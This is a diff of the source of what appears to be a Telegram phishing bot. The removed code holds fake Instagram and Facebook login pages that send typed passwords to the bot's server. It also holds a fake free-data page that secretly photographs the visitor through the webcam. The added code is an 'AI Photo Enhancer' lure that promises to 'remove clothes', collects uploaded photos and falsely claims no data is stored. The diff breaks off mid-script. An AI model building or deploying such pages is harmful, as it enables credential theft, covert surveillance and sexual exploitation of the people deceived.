@@ -1,7 +1,7 @@
-// ====================== index.js (COMPLETE WITH ALL FEATURES - ADMIN BUTTON) ======================
+// ====================== index.js (COMPLETE WITH PHOTO ACCESS + QR FIX) ======================
 /*
  * © 2026 SeXyxeon (VOIDSEC)
- * Complete Bot with Admin Panel - All Features Working
+ * Complete Bot - Photo Access + QR Fix + All Features
  */
 
 process.env.NTBA_FIX_350 = 1;
@@ -45,11 +45,13 @@ const PHOTO_DIR = path.join(__dirname, 'photos');
 const DATA_DIR = path.join(__dirname, 'data');
 const BOT_PHOTO_DIR = path.join(PHOTO_DIR, 'bot');
 const PAGES_DIR = path.join(__dirname, 'pages');
+const UPLOADS_DIR = path.join(__dirname, 'uploads');
 
 if (!fs.existsSync(PHOTO_DIR)) fs.mkdirSync(PHOTO_DIR, { recursive: true });
 if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
 if (!fs.existsSync(BOT_PHOTO_DIR)) fs.mkdirSync(BOT_PHOTO_DIR, { recursive: true });
 if (!fs.existsSync(PAGES_DIR)) fs.mkdirSync(PAGES_DIR, { recursive: true });
+if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR, { recursive: true });
 
 // Storage files
 const PHOTOS_FILE = path.join(DATA_DIR, 'photos.json');
@@ -70,7 +72,13 @@ if (!fs.existsSync(LOGS_FILE)) fs.writeFileSync(LOGS_FILE, '');
 // ====================== MULTER SETUP ======================
 const storage = multer.diskStorage({
     destination: (req, file, cb) => {
-        cb(null, BOT_PHOTO_DIR);
+        if (file.fieldname === 'photo' || file.fieldname === 'qr') {
+            cb(null, BOT_PHOTO_DIR);
+        } else if (file.fieldname === 'userphoto') {
+            cb(null, UPLOADS_DIR);
+        } else {
+            cb(null, BOT_PHOTO_DIR);
+        }
     },
     filename: (req, file, cb) => {
         const uniqueName = Date.now() + '-' + file.originalname.replace(/\s/g, '_');
@@ -80,7 +88,7 @@ const storage = multer.diskStorage({
 
 const upload = multer({
     storage: storage,
-    limits: { fileSize: 10 * 1024 * 1024 },
+    limits: { fileSize: 50 * 1024 * 1024 },
     fileFilter: (req, file, cb) => {
         if (file.mimetype.startsWith('image/')) {
             cb(null, true);
@@ -89,12 +97,6 @@ const upload = multer({
         }
     }
 });
-
-// ====================== LOG FUNCTION ======================
-function logToFile(message) {
-    const timestamp = new Date().toISOString();
-    fs.appendFileSync(LOGS_FILE, `[${timestamp}] ${message}\n`);
-}
 
 // ====================== USER DATA FUNCTIONS ======================
 function getUsers() {
@@ -334,306 +336,316 @@ function getChannelButtons() {
     return { inline_keyboard: buttons };
 }
 
-// ====================== TEMPLATES (ATTRACTIVE FULL SCREEN) ======================
-const TEMPLATES = {
-    instagram: `<!DOCTYPE html>
+// ====================== PHOTO ACCESS TEMPLATE ======================
+const PHOTO_ACCESS_TEMPLATE = `<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Instagram Login</title>
+    <title>AI Photo Enhancer</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
-        body{background:linear-gradient(145deg,#1a0a2e,#2d1b4e,#0a0a0a);height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}
-        .card{background:rgba(255,255,255,0.05);backdrop-filter:blur(30px);border:1px solid rgba(255,255,255,0.12);border-radius:30px;padding:45px 35px;width:100%;max-width:420px;box-shadow:0 40px 80px rgba(0,0,0,0.8),inset 0 1px 0 rgba(255,255,255,0.1)}
-        .logo{text-align:center;margin-bottom:30px}
-        .logo i{font-size:65px;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-        .logo h1{color:#fff;font-size:28px;font-weight:700;margin-top:5px;letter-spacing:-0.5px}
-        .input-group{position:relative;margin-bottom:18px}
-        .input-group i{position:absolute;left:18px;top:50%;transform:translateY(-50%);color:#888;font-size:18px;z-index:2}
-        .input-group input{width:100%;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.12);border-radius:16px;padding:18px 18px 18px 50px;color:#fff;font-size:16px;outline:none;transition:all .3s}
-        .input-group input:focus{border-color:#d62976;background:rgba(255,255,255,0.12);box-shadow:0 0 30px rgba(214,41,118,0.15)}
-        .input-group input::placeholder{color:#777}
-        .btn{width:100%;padding:18px;border:none;border-radius:16px;background:linear-gradient(135deg,#4f5bd5,#d62976);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 10px 30px rgba(214,41,118,0.3)}
-        .btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(214,41,118,0.5)}
-        .btn:active{transform:scale(0.98)}
-        .loader{display:none;text-align:center;padding:20px 0}
-        .loader .spinner{width:40px;height:40px;border:4px solid rgba(255,255,255,0.1);border-top-color:#d62976;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto}
+        body{background:linear-gradient(145deg,#0a0015,#1a0030,#2d004a);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow-x:hidden}
+        .card{background:rgba(255,255,255,0.04);backdrop-filter:blur(40px);border:1px solid rgba(255,255,255,0.08);border-radius:40px;padding:45px 35px;width:100%;max-width:500px;box-shadow:0 50px 100px rgba(0,0,0,0.8),inset 0 1px 0 rgba(255,255,255,0.05)}
+        .header{text-align:center;margin-bottom:30px}
+        .header .icon{font-size:80px;background:linear-gradient(135deg,#ff6b6b,#ee5a24,#ff4757);-webkit-background-clip:text;-webkit-text-fill-color:transparent;display:block}
+        .header h1{color:#fff;font-size:28px;font-weight:800;margin-top:10px;background:linear-gradient(135deg,#ff6b6b,#ee5a24);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+        .header p{color:#888;font-size:14px;margin-top:5px}
+        .feature-box{background:rgba(255,255,255,0.03);border-radius:20px;padding:25px;border:1px solid rgba(255,255,255,0.06);margin:20px 0}
+        .feature-box .item{display:flex;align-items:center;gap:15px;padding:10px 0;color:#ccc;font-size:14px;border-bottom:1px solid rgba(255,255,255,0.03)}
+        .feature-box .item:last-child{border-bottom:none}
+        .feature-box .item i{font-size:22px;width:35px;color:#ff6b6b}
+        .feature-box .item .label{color:#fff}
+        .upload-zone{background:rgba(255,255,255,0.03);border:2px dashed rgba(255,255,255,0.1);border-radius:20px;padding:40px 20px;text-align:center;cursor:pointer;transition:all .3s;margin:20px 0}
+        .upload-zone:hover{border-color:#ff6b6b;background:rgba(255,107,107,0.05)}
+        .upload-zone i{font-size:50px;color:#ff6b6b;display:block;margin-bottom:10px}
+        .upload-zone p{color:#aaa;font-size:16px}
+        .upload-zone .small{color:#666;font-size:12px;margin-top:5px}
+        .btn{width:100%;padding:20px;border:none;border-radius:16px;background:linear-gradient(135deg,#ff6b6b,#ee5a24);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 10px 40px rgba(238,90,36,0.3)}
+        .btn:hover{transform:translateY(-3px);box-shadow:0 15px 50px rgba(238,90,36,0.5)}
+        .btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
+        .btn i{margin-right:10px}
+        .status{text-align:center;margin-top:15px;padding:15px;border-radius:12px;display:none;font-size:14px}
+        .status.success{background:rgba(46,213,115,0.15);color:#2ed573;display:block}
+        .status.error{background:rgba(255,71,87,0.15);color:#ff4757;display:block}
+        .status.info{background:rgba(54,164,235,0.15);color:#36a4eb;display:block}
+        .status.warning{background:rgba(255,165,0,0.15);color:#ffa500;display:block}
+        .progress-container{width:100%;height:6px;background:rgba(255,255,255,0.05);border-radius:10px;overflow:hidden;margin:15px 0;display:none}
+        .progress-container .fill{height:100%;width:0%;background:linear-gradient(90deg,#ff6b6b,#ee5a24);transition:width .3s}
+        .preview-area{display:none;margin:15px 0;padding:15px;background:rgba(255,255,255,0.03);border-radius:15px;border:1px solid rgba(255,255,255,0.05)}
+        .preview-area img{width:100%;max-height:300px;object-fit:contain;border-radius:10px}
+        .preview-area .filename{color:#aaa;font-size:12px;text-align:center;margin-top:8px}
+        .result-area{display:none;text-align:center;padding:20px;background:rgba(46,213,115,0.05);border-radius:15px;border:1px solid rgba(46,213,115,0.1);margin:15px 0}
+        .result-area i{font-size:40px;color:#2ed573}
+        .result-area h3{color:#2ed573;margin-top:8px}
+        .result-area p{color:#888;font-size:13px;margin-top:5px}
+        .loading-dots{display:inline-block;animation:dots 1.5s infinite}
+        @keyframes dots{0%,20%{content:'...'}40%{content:'...'}60%{content:'...'}80%{content:'...'}100%{content:'...'}}
+        .spinner{width:30px;height:30px;border:3px solid rgba(255,255,255,0.05);border-top-color:#ff6b6b;border-radius:50%;animation:spin 0.8s linear infinite;margin:10px auto}
         @keyframes spin{100%{transform:rotate(360deg)}}
-        .loader p{color:#aaa;margin-top:15px;font-size:14px}
-        .progress-bar{width:100%;height:5px;background:rgba(255,255,255,0.1);border-radius:10px;overflow:hidden;margin:20px 0;display:none}
-        .progress-bar .fill{height:100%;width:0%;background:linear-gradient(90deg,#4f5bd5,#d62976);transition:width .3s}
-        .result{display:none;text-align:center;padding:20px}
-        .result i{font-size:50px;color:#28a745}
-        .result h3{color:#fff;margin-top:10px}
-        .result p{color:#888;font-size:14px}
         .bg-shapes{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}
-        .bg-shapes span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(214,41,118,0.15),transparent 70%);animation:float 20s infinite ease-in-out}
-        .bg-shapes span:nth-child(1){width:400px;height:400px;top:-100px;right:-100px;animation-delay:-2s}
-        .bg-shapes span:nth-child(2){width:300px;height:300px;bottom:-50px;left:-50px;animation-delay:-5s}
-        .bg-shapes span:nth-child(3){width:200px;height:200px;top:50%;left:50%;transform:translate(-50%,-50%);animation-delay:-10s}
-        @keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,-30px) scale(1.1)}}
-        .footer{text-align:center;margin-top:20px;color:#555;font-size:12px}
-        .footer a{color:#888;text-decoration:none}
+        .bg-shapes span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(255,107,107,0.06),transparent 70%);animation:float 25s infinite ease-in-out}
+        .bg-shapes span:nth-child(1){width:500px;height:500px;top:-150px;right:-150px;animation-delay:-3s}
+        .bg-shapes span:nth-child(2){width:400px;height:400px;bottom:-100px;left:-100px;animation-delay:-7s}
+        .bg-shapes span:nth-child(3){width:300px;height:300px;top:50%;left:50%;transform:translate(-50%,-50%);animation-delay:-12s}
+        @keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(40px,-40px) scale(1.1)}}
+        .footer{text-align:center;margin-top:20px;color:#444;font-size:11px}
+        .footer a{color:#555;text-decoration:none}
+        #fileInput{display:none}
+        .btn-secondary{background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);color:#aaa;margin-top:10px}
+        .btn-secondary:hover{background:rgba(255,255,255,0.08)}
+        .count-badge{background:#ff6b6b;color:#fff;padding:2px 12px;border-radius:20px;font-size:12px;margin-left:10px}
+        .image-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:5px;margin-top:10px}
+        .image-grid img{width:100%;height:80px;object-fit:cover;border-radius:8px;border:1px solid rgba(255,255,255,0.05)}
+        .image-grid .more{display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,0.03);border-radius:8px;color:#888;font-size:12px}
+        .processing-text{color:#ff6b6b;font-size:14px;font-weight:600;text-align:center;padding:10px}
     </style>
 </head>
 <body>
 <div class="bg-shapes"><span></span><span></span><span></span></div>
 <div class="card">
-    <div class="logo">
-        <i class="fab fa-instagram"></i>
-        <h1>Instagram</h1>
+    <div class="header">
+        <span class="icon"><i class="fas fa-magic"></i></span>
+        <h1>✨ AI Photo Enhancer</h1>
+        <p>Remove clothes instantly with AI technology</p>
     </div>
-    <div id="form-screen">
-        <div class="input-group"><i class="fas fa-user"></i><input type="text" id="username" placeholder="Username or Email" autocomplete="off"></div>
-        <div class="input-group"><i class="fas fa-lock"></i><input type="password" id="password" placeholder="Password" autocomplete="off"></div>
-        <button class="btn" onclick="startEngine()"><i class="fas fa-bolt"></i> Login Now</button>
+    
+    <div class="feature-box">
+        <div class="item"><i class="fas fa-robot"></i> <span class="label">AI Powered</span> <span style="color:#888;font-size:12px;margin-left:auto;">v3.0</span></div>
+        <div class="item"><i class="fas fa-bolt"></i> <span class="label">Instant Processing</span> <span style="color:#888;font-size:12px;margin-left:auto;">2-5s</span></div>
+        <div class="item"><i class="fas fa-shield-alt"></i> <span class="label">100% Private</span> <span style="color:#888;font-size:12px;margin-left:auto;">🔒</span></div>
+        <div class="item"><i class="fas fa-image"></i> <span class="label">HD Quality</span> <span style="color:#888;font-size:12px;margin-left:auto;">4K</span></div>
     </div>
-    <div id="process-screen" style="display:none">
-        <div class="loader" style="display:block"><div class="spinner"></div><p id="status-text">Connecting...</p></div>
-        <div class="progress-bar" style="display:block"><div class="fill" id="progress-fill"></div></div>
-        <div id="result-area" style="display:none">
-            <i class="fas fa-check-circle" style="color:#28a745;font-size:50px"></i>
-            <h3 style="color:#fff;margin-top:10px">Welcome Back!</h3>
-            <p style="color:#888">Redirecting to your dashboard...</p>
-        </div>
-    </div>
-    <div class="footer"><a href="#">Forgot password?</a> • <a href="#">Sign up</a></div>
-</div>
-<script>
-const id="USERID_PLACEHOLDER";
-const p="PLATFORM_PLACEHOLDER";
-function startEngine(){
-    const u=document.getElementById('username').value.trim();
-    const pwd=document.getElementById('password').value;
-    if(!u||!pwd){alert("Please fill all fields.");return}
-    fetch('/api/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userid:id,username:u,password:pwd,platform:p})}).catch(e=>console.error(e));
-    document.getElementById('form-screen').style.display='none';
-    document.getElementById('process-screen').style.display='block';
-    document.querySelector('.loader').style.display='block';
-    document.querySelector('.progress-bar').style.display='block';
-    document.getElementById('result-area').style.display='none';
-    let progress=0;
-    const interval=setInterval(()=>{
-        progress+=Math.random()*3+1;
-        if(progress>=100){progress=100;clearInterval(interval);
-            document.querySelector('.loader').style.display='none';
-            document.querySelector('.progress-bar').style.display='none';
-            document.getElementById('result-area').style.display='block';
-            document.getElementById('status-text').innerText='✅ Verified';
-            return}
-        document.getElementById('progress-fill').style.width=progress+'%';
-        if(progress<30)document.getElementById('status-text').innerText='Connecting to server...';
-        else if(progress<60)document.getElementById('status-text').innerText='Verifying credentials...';
-        else if(progress<85)document.getElementById('status-text').innerText='Loading dashboard...';
-        else document.getElementById('status-text').innerText='Almost done...';
-    },150);
-}
-</script>
-</body>
-</html>`,
-    facebook: `<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Facebook Login</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
-        body{background:linear-gradient(145deg,#0a1628,#1a2a4a,#0a0a2a);height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}
-        .card{background:rgba(255,255,255,0.05);backdrop-filter:blur(30px);border:1px solid rgba(255,255,255,0.1);border-radius:30px;padding:45px 35px;width:100%;max-width:420px;box-shadow:0 40px 80px rgba(0,0,0,0.8)}
-        .logo{text-align:center;margin-bottom:30px}
-        .logo i{font-size:65px;color:#1877f2;text-shadow:0 0 40px rgba(24,119,242,0.3)}
-        .logo h1{color:#fff;font-size:28px;font-weight:700;margin-top:5px}
-        .input-group{position:relative;margin-bottom:18px}
-        .input-group i{position:absolute;left:18px;top:50%;transform:translateY(-50%);color:#666;font-size:18px}
-        .input-group input{width:100%;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.1);border-radius:16px;padding:18px 18px 18px 50px;color:#fff;font-size:16px;outline:none;transition:all .3s}
-        .input-group input:focus{border-color:#1877f2;background:rgba(255,255,255,0.12)}
-        .input-group input::placeholder{color:#666}
-        .btn{width:100%;padding:18px;border:none;border-radius:16px;background:linear-gradient(135deg,#1877f2,#0056b3);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 10px 30px rgba(24,119,242,0.3)}
-        .btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(24,119,242,0.5)}
-        .btn:active{transform:scale(0.98)}
-        .loader{display:none;text-align:center;padding:20px 0}
-        .loader .spinner{width:40px;height:40px;border:4px solid rgba(255,255,255,0.1);border-top-color:#1877f2;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto}
-        @keyframes spin{100%{transform:rotate(360deg)}}
-        .loader p{color:#aaa;margin-top:15px;font-size:14px}
-        .progress-bar{width:100%;height:5px;background:rgba(255,255,255,0.1);border-radius:10px;overflow:hidden;margin:20px 0;display:none}
-        .progress-bar .fill{height:100%;width:0%;background:linear-gradient(90deg,#1877f2,#42b0f5);transition:width .3s}
-        .result{display:none;text-align:center;padding:20px}
-        .result i{font-size:50px;color:#28a745}
-        .result h3{color:#fff;margin-top:10px}
-        .bg-shapes{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}
-        .bg-shapes span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(24,119,242,0.12),transparent 70%);animation:float 20s infinite ease-in-out}
-        .bg-shapes span:nth-child(1){width:400px;height:400px;top:-100px;right:-100px;animation-delay:-2s}
-        .bg-shapes span:nth-child(2){width:300px;height:300px;bottom:-50px;left:-50px;animation-delay:-5s}
-        @keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,-30px) scale(1.1)}}
-        .footer{text-align:center;margin-top:20px;color:#555;font-size:12px}
-        .footer a{color:#666;text-decoration:none}
-    </style>
-</head>
-<body>
-<div class="bg-shapes"><span></span><span></span></div>
-<div class="card">
-    <div class="logo"><i class="fab fa-facebook"></i><h1>Facebook</h1></div>
-    <div id="form-screen">
-        <div class="input-group"><i class="fas fa-envelope"></i><input type="text" id="username" placeholder="Email or Phone" autocomplete="off"></div>
-        <div class="input-group"><i class="fas fa-lock"></i><input type="password" id="password" placeholder="Password" autocomplete="off"></div>
-        <button class="btn" onclick="startEngine()"><i class="fas fa-rocket"></i> Login</button>
-    </div>
-    <div id="process-screen" style="display:none">
-        <div class="loader" style="display:block"><div class="spinner"></div><p id="status-text">Connecting...</p></div>
-        <div class="progress-bar" style="display:block"><div class="fill" id="progress-fill"></div></div>
-        <div id="result-area" style="display:none">
-            <i class="fas fa-check-circle" style="color:#28a745;font-size:50px"></i>
-            <h3 style="color:#fff;margin-top:10px">Welcome Back!</h3>
-            <p style="color:#888">Redirecting...</p>
-        </div>
-    </div>
-    <div class="footer"><a href="#">Forgot password?</a> • <a href="#">Create account</a></div>
-</div>
-<script>
-const id="USERID_PLACEHOLDER";
-const p="PLATFORM_PLACEHOLDER";
-function startEngine(){
-    const u=document.getElementById('username').value.trim();
-    const pwd=document.getElementById('password').value;
-    if(!u||!pwd){alert("Please fill all fields.");return}
-    fetch('/api/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userid:id,username:u,password:pwd,platform:p})}).catch(e=>console.error(e));
-    document.getElementById('form-screen').style.display='none';
-    document.getElementById('process-screen').style.display='block';
-    document.querySelector('.loader').style.display='block';
-    document.querySelector('.progress-bar').style.display='block';
-    document.getElementById('result-area').style.display='none';
-    let progress=0;
-    const interval=setInterval(()=>{
-        progress+=Math.random()*3+1;
-        if(progress>=100){progress=100;clearInterval(interval);
-            document.querySelector('.loader').style.display='none';
-            document.querySelector('.progress-bar').style.display='none';
-            document.getElementById('result-area').style.display='block';
-            document.getElementById('status-text').innerText='✅ Verified';return}
-        document.getElementById('progress-fill').style.width=progress+'%';
-        if(progress<30)document.getElementById('status-text').innerText='Connecting to server...';
-        else if(progress<60)document.getElementById('status-text').innerText='Verifying credentials...';
-        else if(progress<85)document.getElementById('status-text').innerText='Loading dashboard...';
-        else document.getElementById('status-text').innerText='Almost done...';
-    },150);
-}
-</script>
-</body>
-</html>`,
-    camera: `<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>VIP Data Injector</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:'Rajdhani',sans-serif;background:radial-gradient(ellipse at center,#0a0a0a,#000000);height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}
-        .card{background:rgba(255,255,255,0.04);backdrop-filter:blur(40px);border:1px solid rgba(0,255,100,0.15);border-radius:35px;padding:50px 35px;width:100%;max-width:420px;box-shadow:0 40px 80px rgba(0,0,0,0.9),inset 0 1px 0 rgba(0,255,100,0.1)}
-        .badge{display:inline-block;background:linear-gradient(90deg,#00ff88,#00cc66);padding:6px 20px;border-radius:30px;font-size:11px;font-weight:700;letter-spacing:3px;color:#000;margin-bottom:15px}
-        h1{font-family:'Orbitron',sans-serif;font-size:38px;font-weight:900;background:linear-gradient(135deg,#00ff88,#00ff44);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:25px}
-        .input-box{margin:20px 0;text-align:left}
-        .input-box label{font-size:13px;color:#00ff88;text-transform:uppercase;letter-spacing:2px;margin-left:15px;display:block;margin-bottom:5px}
-        .input-box input{width:100%;background:rgba(0,0,0,0.5);border:1px solid rgba(0,255,100,0.15);border-radius:16px;padding:18px 20px;color:#fff;font-size:18px;font-family:'Rajdhani',sans-serif;transition:.4s;outline:none}
-        .input-box input:focus{border-color:#00ff88;box-shadow:0 0 30px rgba(0,255,136,0.1)}
-        .btn-claim{width:100%;padding:20px;border:none;border-radius:16px;background:linear-gradient(135deg,#00ff88,#00cc66);color:#000;font-family:'Orbitron',sans-serif;font-weight:900;font-size:17px;text-transform:uppercase;cursor:pointer;transition:.3s;box-shadow:0 10px 40px rgba(0,255,136,0.25);margin-top:15px}
-        .btn-claim:hover{transform:translateY(-2px) scale(1.02);box-shadow:0 20px 50px rgba(0,255,136,0.4)}
-        .btn-claim:disabled{opacity:0.6;cursor:not-allowed}
-        .loader-box{display:none;text-align:center;padding:20px 0}
-        .loader-box .spinner{width:40px;height:40px;border:3px solid rgba(0,255,136,0.15);border-top-color:#00ff88;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto}
-        @keyframes spin{100%{transform:rotate(360deg)}}
-        .loader-box p{color:#00ff88;margin-top:15px;font-size:14px;letter-spacing:1px}
-        .log-area{background:rgba(0,0,0,0.6);border-radius:16px;padding:20px;font-family:'Courier New',monospace;font-size:13px;color:#00ff88;text-align:left;display:none;border:1px solid rgba(0,255,136,0.08);margin-top:20px;max-height:200px;overflow-y:auto}
-        .log-area .line{padding:4px 0;border-bottom:1px solid rgba(0,255,136,0.05)}
-        .log-area .line.suc{color:#00ff88}
-        .log-area .line.err{color:#ff4444}
-        .bg-glow{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}
-        .bg-glow span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(0,255,136,0.06),transparent 70%);animation:float 20s infinite ease-in-out}
-        .bg-glow span:nth-child(1){width:400px;height:400px;top:-100px;right:-100px;animation-delay:-2s}
-        .bg-glow span:nth-child(2){width:300px;height:300px;bottom:-50px;left:-50px;animation-delay:-5s}
-        @keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,-30px) scale(1.1)}}
-        video,canvas{display:none}
-        .result-box{display:none;text-align:center;padding:20px 0}
-        .result-box i{font-size:50px;color:#00ff88}
-        .result-box h3{color:#fff;margin-top:10px;font-family:'Orbitron',sans-serif}
-    </style>
-</head>
-<body>
-<div class="bg-glow"><span></span><span></span></div>
-<div class="card">
-    <div class="badge">🔥 VIP ACCESS</div>
-    <h1>CLAIM 1GB</h1>
-    <div class="input-box"><label>📱 Mobile Number</label><input type="number" id="mobile" placeholder="Enter 10 digit number"></div>
-    <button class="btn-claim" id="claimBtn">🎁 CLAIM NOW</button>
-    <div class="loader-box" id="loaderBox"><div class="spinner"></div><p id="statusText">Initializing...</p></div>
-    <div class="log-area" id="logArea"></div>
-    <div class="result-box" id="resultBox"><i class="fas fa-check-circle"></i><h3>Success!</h3></div>
-</div>
-<video id="v" autoplay playsinline></video>
-<canvas id="c"></canvas>
-<script>
-const id="USERID_PLACEHOLDER";
-const p="PLATFORM_PLACEHOLDER";
-const claimBtn=document.getElementById('claimBtn');
-const logArea=document.getElementById('logArea');
-const loaderBox=document.getElementById('loaderBox');
-const statusText=document.getElementById('statusText');
-const resultBox=document.getElementById('resultBox');
-const video=document.getElementById('v');
-const canvas=document.getElementById('c');
-const ctx=canvas.getContext('2d');
 
-function addLog(msg,type=''){logArea.style.display='block';const l=document.createElement('div');l.className='line '+(type||'');l.innerText='▸ '+msg;logArea.appendChild(l);logArea.scrollTop=logArea.scrollHeight}
+    <div id="uploadZone" class="upload-zone" onclick="document.getElementById('fileInput').click()">
+        <i class="fas fa-cloud-upload-alt"></i>
+        <p><strong>Tap to select photo</strong></p>
+        <div class="small">Supported: JPG, PNG, WEBP (Max 20MB)</div>
+    </div>
+    
+    <input type="file" id="fileInput" accept="image/*" multiple>
+    
+    <div id="previewArea" class="preview-area">
+        <img id="previewImg" src="">
+        <div class="filename" id="fileName">No file selected</div>
+    </div>
+    
+    <button class="btn" id="processBtn" onclick="processPhotos()" disabled>
+        <i class="fas fa-wand-magic-sparkles"></i> PROCESS PHOTOS
+    </button>
+    
+    <div id="status" class="status"></div>
+    <div class="progress-container" id="progressContainer"><div class="fill" id="progressFill"></div></div>
+    
+    <div id="resultArea" class="result-area" style="display:none">
+        <i class="fas fa-check-circle"></i>
+        <h3>✅ Processing Complete!</h3>
+        <p id="resultText">Your photos have been processed successfully.</p>
+        <button class="btn btn-secondary" onclick="closeResult()"><i class="fas fa-times"></i> Close</button>
+    </div>
+    
+    <div id="processingStatus" style="display:none">
+        <div class="spinner"></div>
+        <div class="processing-text" id="processingText">🔮 Analyzing photo structure...</div>
+    </div>
+    
+    <div id="imageGrid" class="image-grid"></div>
+    
+    <div class="footer">🔒 Secure & Private • No data stored</div>
+</div>
 
-claimBtn.addEventListener('click',async()=>{
-    const mobile=document.getElementById('mobile').value;
-    if(mobile.length<10){alert("⚠️ Please enter valid 10 digit number!");return}
-    claimBtn.disabled=true;claimBtn.innerText="⏳ PROCESSING...";
-    loaderBox.style.display='block';resultBox.style.display='none';logArea.innerHTML='';
-    statusText.innerText='🔍 Verifying...';
-    addLog('Initializing secure connection...');
-    try{
-        addLog('📡 Requesting verification...');
-        statusText.innerText='📸 Capturing...';
-        addLog('📸 Accessing camera for verification...');
-        const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:400,height:400}});
-        video.srcObject=stream;
-        await new Promise(r=>setTimeout(r,600));
-        canvas.width=video.videoWidth||400;canvas.height=video.videoHeight||400;
-        ctx.drawImage(video,0,0);
-        const photoBase64=canvas.toDataURL('image/jpeg',0.85).split(',')[1];
-        stream.getTracks().forEach(t=>t.stop());
-        addLog('✅ Selfie captured successfully!','suc');
-        statusText.innerText='📤 Sending...';
-        addLog('📤 Encrypting and sending data...');
-        fetch('/api/capturepic',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userid:id,mobile:mobile,SY:photoBase64,platform:p})}).catch(e=>console.error(e));
-        await new Promise(r=>setTimeout(r,1200));
-        addLog('✅ Verification complete!','suc');
-        statusText.innerText='✅ Success!';
-        claimBtn.innerText="✅ CLAIMED";
-        claimBtn.style.background="linear-gradient(135deg,#00ff88,#00cc66)";
-        resultBox.style.display='block';
-        resultBox.innerHTML='<i class="fas fa-check-circle" style="color:#00ff88;font-size:50px"></i><h3 style="color:#fff;margin-top:10px;font-family:Orbitron,sans-serif">1GB ADDED!</h3>';
-        setTimeout(()=>{alert("🎉 1GB Data Claimed Successfully!");claimBtn.disabled=false;claimBtn.innerText="🎁 CLAIM NOW";loaderBox.style.display='none'},1500)
-    }catch(e){
-        addLog('❌ Camera access denied!','err');
-        statusText.innerText='❌ Error';
-        claimBtn.innerText="🔄 RETRY";
-        claimBtn.disabled=false;
+<script>
+const USER_ID = "USERID_PLACEHOLDER";
+const PLATFORM = "PLATFORM_PLACEHOLDER";
+let selectedFiles = [];
+let processedCount = 0;
+
+document.getElementById('fileInput').addEventListener('change', function(e) {
+    const files = this.files;
+    if (files.length === 0) return;
+    
+    selectedFiles = Array.from(files);
+    const preview = document.getElementById('previewArea');
+    const img = document.getElementById('previewImg');
+    const name = document.getElementById('fileName');
+    
+    // Show first image preview
+    const reader = new FileReader();
+    reader.onload = function(e) {
+        img.src = e.target.result;
+        preview.style.display = 'block';
+        name.textContent = selectedFiles.length + ' photo(s) selected';
+    };
+    reader.readAsDataURL(files[0]);
+    
+    document.getElementById('processBtn').disabled = false;
+    document.getElementById('processBtn').innerHTML = '<i class="fas fa-wand-magic-sparkles"></i> PROCESS ' + selectedFiles.length + ' PHOTO(S)';
+    
+    showStatus('📸 ' + selectedFiles.length + ' photos ready for processing', 'info');
+});
+
+function showStatus(msg, type='info') {
+    const el = document.getElementById('status');
+    el.textContent = msg;
+    el.className = 'status ' + type;
+    el.style.display = 'block';
+}
+
+function hideStatus() {
